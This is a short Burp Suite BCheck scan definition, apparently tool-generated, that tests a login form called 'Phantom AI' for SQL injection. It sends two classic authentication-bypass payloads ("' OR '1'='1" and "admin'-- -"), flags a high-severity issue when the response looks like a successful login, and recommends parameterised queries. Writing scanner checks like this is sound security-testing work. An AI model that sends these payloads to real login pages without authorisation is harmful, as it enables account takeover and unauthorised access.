metadata:
  language: v2-beta
  name: "SQLi - Phantom Login Aggressive"
  description: "Aggressive SQL injection payloads for Phantom AI login."
  author: "BCheck-MCP"
  tags: "sqli", "injection", "bcheck-mcp"

given insertion point then
  send payload:
    replacing: "' OR '1'='1"
  if {to_lower(latest.response.body)} matches "welcome|dashboard|logged in|invalid" then
    report issue:
      severity: high
      confidence: tentative
      detail: "Possible SQL injection: OR-based payload changed application response."
      remediation: "Use parameterised queries or prepared statements."
  end if
  send payload:
    replacing: "admin'-- -"
  if {to_lower(latest.response.body)} matches "welcome|dashboard|logged in" then
    report issue:
      severity: high
      confidence: tentative
      detail: "Possible SQL authentication bypass: comment payload changed login response."
      remediation: "Use parameterised queries or prepared statements."
  end if
